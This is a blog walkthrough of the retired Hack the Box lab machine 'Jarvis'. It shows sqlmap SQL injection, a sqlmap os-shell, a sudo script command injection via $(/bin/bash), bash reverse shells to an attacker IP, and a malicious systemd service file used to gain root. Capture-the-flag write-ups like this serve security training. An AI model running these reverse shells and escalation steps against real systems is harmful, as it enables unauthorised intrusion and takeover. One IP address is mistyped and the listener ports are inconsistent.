---
title: 'Hack the Box- Jarvis Walkthrough'
date: 2020-01-27T18:34:00+01:00
draft: false
---

This article is a walkthrough for the retired machine “Jarvis” on Hack the Box. This machine has a static IP address of **10.10.10.143.** Hack the Box is a website to test your hands-on penetration testing on intentionally vulnerable machines.

**Level:** Easy

**Task:** find user.txt and root.txt in the victim’s machine.

### **Penetration Methodology**

**Scanning**

*   Open ports and running services

**Enumeration**

*   Directories enumeration

**Exploitation**

*   Fuzzing to find SQLi
*   Exploiting SQLi using SQLmap
*   Spawning os-shell in SQLmap
*   Getting a meterpreter shell

**Post Exploitation**

*   Enumerating sudoers file
*   Running simpler.py script as user pepper
*   Gaining access to user pepper
*   Post exploitation using SUID set on systemctl
*   Gaining root access

**Snagging the root flag**

Let’s begin

We used the nmap aggressive scan on our target IP **10.10.10.143**  and observed that ports 22 and 80 were open.

![](https://i0.wp.com/1.bp.blogspot.com/-us6gFne8hGA/Xi8Za08npYI/AAAAAAAAihA/dW0CANpKXh4MjipRpswqAOnUO5W6NXZ5QCLcBGAsYHQ/s1600/1.png?w=687&ssl=1)

On moving to the website, we saw a website of some hotel running. The interface was very simple and nothing much could be obtained just by having a look at the source code or even running directory enumeration.

![](https://i0.wp.com/1.bp.blogspot.com/-OGKAKlK8qHQ/Xi8Zc3Zr6gI/AAAAAAAAihQ/PV7MhMA8N481uNf5VJ8DRICh8BH1AuEKACLcBGAsYHQ/s1600/2.png?w=687&ssl=1)

We then tried jumping tabs and testing OWASP Top 10, and luckily, we found SQL injection on the rooms page.

![](https://i2.wp.com/1.bp.blogspot.com/-Ij7HZ9y8Il0/Xi8ZdPIBT6I/AAAAAAAAihY/2wgCHkHcsBEzJ9lynaTlhNtE12Gk1BHyACLcBGAsYHQ/s1600/3.1.png?w=687&ssl=1)

The vulnerable parameter was cod. It was obvious then to run sqlmap on this tamperable URL and see what databases were there on the website.

```
sqlmap –u http://10.10.10.143/room.php?cod=1 --dbs --batch
```

![](https://i1.wp.com/1.bp.blogspot.com/-gE9JB0-wVGA/Xi8ZdLiXdmI/AAAAAAAAihU/3bnJh9jzddAQ8iKS7SHrPvg67_UotdODwCLcBGAsYHQ/s1600/3.png?w=687&ssl=1)

We see 4 databases running on the web application server out of which only one database, i.e, hotels seemed interesting.

![](https://i1.wp.com/1.bp.blogspot.com/-Yf7-NkJd-PM/Xi8Zdi3ILUI/AAAAAAAAihc/2myQklkftZMeyXFT9-UVhPIevPpsNeaVwCLcBGAsYHQ/s1600/4.png?w=687&ssl=1)

We couldn’t find much here and there in databases so it made us go another way. There is this option in sqlmap called the “os-shell” that tries and spawns a shell of the webserver.

```
sqlmap –u http://10.10.1.0.143/room.php?cod=1 --dbs --os-shell --batch
```

![](https://i2.wp.com/1.bp.blogspot.com/-fmrgRQgTpTY/Xi8Zd22ozsI/AAAAAAAAihg/1pyGTEPpBqMpBC11J4zjPkxKAVmbqqv8QCLcBGAsYHQ/s1600/5.png?w=687&ssl=1)

And as expected we landed up with a shell of the server. We confirmed the shell using the command id.

![](https://i0.wp.com/1.bp.blogspot.com/-kPMN0wqScTo/Xi8ZeGjLGLI/AAAAAAAAihk/j7fGZWYoSicIJJrduxd7a5YWWp7tINdyQCLcBGAsYHQ/s1600/6.1.png?w=687&ssl=1)

Now we tried to browse to user.txt but the current user didn’t have the permission to read user.txt.

So, we tried to get access to another user but first, we got out of this really slow and weird os-shell interface using a web\_delivery payload and getting a session on meterpreter back.

![](https://i1.wp.com/1.bp.blogspot.com/-fIkJMnzPpL8/Xi8Ze5Pu4rI/AAAAAAAAiho/NgAa_O_ouEYxZeqE2MKDkLswsWhNIrQagCLcBGAsYHQ/s1600/6.png?w=687&ssl=1)

We copied this python command onto the os-shell teletype and got a familiar teletype with us.

While running, we had a need to change the language from **python** to **python3.**

![](https://i2.wp.com/1.bp.blogspot.com/-JB1pxL3yEtI/Xi8ZfKIY9NI/AAAAAAAAihs/1sWgmaYIQBAN9R7c7PiBHSlD08fRqPg9wCLcBGAsYHQ/s1600/7.png?w=687&ssl=1)

Once, we got our meterpreter session, we immediately got into shell mode using shell command. Then spawned a pseudo teletype using python one-liner and finally checked sudoers file to find out a script called **simpler.py** that had permissions to run as root.

```
shell  
python -c ‘import pty;pty.spawn(“/bin/bash”)’  
sudo -u pepper /var/www/Admin-Utilities/simpler.py
```

![](https://i2.wp.com/1.bp.blogspot.com/-3Rm7wHmM2so/Xi8ZfSOh9nI/AAAAAAAAihw/c94BJToiOMwCWtBoYbQis62X7hw8xVDUACLcBGAsYHQ/s1600/8.png?w=687&ssl=1)

On running the script, we see that it was simply pinging the IP. On further review of the source code, we found out that a simple OS injection wouldn’t have sufficed because all the characters are blacklisted

![](https://i0.wp.com/1.bp.blogspot.com/-wGYK2kNuas8/Xi8Zfkw7kQI/AAAAAAAAih0/KIj2iZtukCMx4l9Hh17R6eta-r2CJwh2wCLcBGAsYHQ/s1600/9.png?w=687&ssl=1)

But we see that $ is not restricted. So, running this script as pepper and running our bash binary inside might give us a shell of the user pepper.

```
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p $(/bin/bash)  
ls  
ls -al  
id
```

**![](https://i0.wp.com/1.bp.blogspot.com/-fE233x61BP0/Xi8Zaq5e0kI/AAAAAAAAig4/duLwM7fiCT8M6uh8KqAeLQ6eZ0lCuLZpACLcBGAsYHQ/s1600/11.png?w=687&ssl=1) **

We tried to run basic commands such as ls, id etc but none of them gave us any output. So, we try to get another shell over netcat using a bash payload

```
bash -i >& /dev/tcp/10.10.14.9/1234 0>&1
```

Here, 10.10.14.9 is my IP.

Let’s open a netcat listener on another terminal window. This time, the shell was better and we are able to read the user.txt flag.

Let’s move towards rooting the box.

The first thing that we tried was to find binaries with SUID bit set.

```
netcat -lvp 1234  
cat user.txt  
find / -perm -u=s -type f 2>/dev/null
```

![](https://i1.wp.com/1.bp.blogspot.com/-yS0oOgWjFBg/Xi8Za4VTfMI/AAAAAAAAig8/L_WDaiMxS8ULW1uGrgYLg9SEjLPY4QYdwCLcBGAsYHQ/s1600/12.png?w=687&ssl=1)

We found systemctl had a SUID bit set. It is fairly evident that if we create a .service file, systemctl would run it as root. Let’s create a service file with name raj.service and add a bash binary in it to be run as root so we get a root bash shell.

Here is the code of the service file:

```
\[Unit\]  
Description=hacking articles  
\[Service\]  
Type=simple  
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.9/8888 0>&1'  
\[Install\]  
WantedBy=multi-user.target
```

![](https://i1.wp.com/1.bp.blogspot.com/-yS0oOgWjFBg/Xi8Za4VTfMI/AAAAAAAAig8/L_WDaiMxS8ULW1uGrgYLg9SEjLPY4QYdwCLcBGAsYHQ/s1600/12.png?w=687&ssl=1)

In this service file, ExecStart command was going to give us a root shell on a netcat reverse listener set up at port 1234. We set up netcat listener and downloaded and this raj.service file in the victim’s system.

```
wget http://10.10.14.9:8000/raj.service  
/bin/systemctl enable /home/pepper/raj.service  
/bin/systemctl start raj
```

![](https://i1.wp.com/1.bp.blogspot.com/-oDWW6t5SYSY/Xi8Zbwdp4lI/AAAAAAAAihI/5Q78zcW_a5YCGU1QhY0ywnPAdXdSgNR1wCLcBGAsYHQ/s1600/15.png?w=687&ssl=1)

On our listener, we were successfully able to get a reverse shell and voila! We got root.

```
nc -lvp 8888  
cd /root  
cat root.txt
```

![](https://i1.wp.com/1.bp.blogspot.com/-hlj_z9Haesk/Xi8ZcNocN1I/AAAAAAAAihM/D2qJNxBNmoII5g0jfjRfzH9YZ1z9txcGQCLcBGAsYHQ/s1600/16.png?w=687&ssl=1)

We snagged the flag and that’s how we got root access to the system. It was a well-balanced lab and there was a lot of new learning. There were no unnecessary exploit development and hence, we’d rate this as **intermediate.**

**Author: Harshit Rajpal **is an InfoSec researcher and left and right brain thinker. contact** [here](https://in.linkedin.com/in/harshit-rajpal-79bb43103)**

The post [Hack the Box- Jarvis Walkthrough](https://www.hackingarticles.in/hack-the-box-jarvis-walkthrough/) appeared first on [Hacking Articles](https://www.hackingarticles.in).

  
  
from Hacking Articles https://ift.tt/38MLIuz